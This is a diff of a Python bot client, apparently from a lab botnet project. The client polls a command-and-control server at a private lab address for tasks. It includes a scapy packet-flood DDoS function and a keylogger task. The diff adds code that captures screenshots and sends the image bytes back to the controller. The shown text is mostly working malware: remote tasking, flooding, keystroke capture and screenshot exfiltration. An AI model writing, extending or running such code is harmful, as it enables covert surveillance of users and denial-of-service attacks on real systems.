@@ -22,7 +22,7 @@ def ddos(target_IP):
     p = ip / tcp / raw
     send(p, loop=1, verbose = 0)
 
-HOST = "127.0.0.1"
+HOST = "192.168.56.103"
 PORT = 1234
 ddosprocess = Process(target=ddos)
 
@@ -31,7 +31,7 @@ while True:
     # Obtain current task with socket?
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
         s.connect((HOST, PORT))
-        s.sendall(b"Hello, world")
+        s.sendall(b"Done")
         data = s.recv(1024)
         task = data.decode('utf-8').split(" ")
         # List of current files and latest file added which we might use for some actions
@@ -48,6 +48,14 @@ while True:
             PATH = os.path.dirname('task.txt')
             myScreenshot = pyautogui.screenshot()
             myScreenshot.save(PATH + f"screenshot_{date}" + ".png")
+            
+            with open(PATH + f"screenshot_{date}" + ".png", 'rb') as file:
+                print("Sending screenshot...")
+                imgbytes = file.read()
+                print("Read file")
+                s.sendall(imgbytes)
+                print("Sent data")
+                print(s.recv(1024))
 
         # The keylogger cannot be stopped except by stopping the whole program!!
         elif task[0] == 'keylogger':
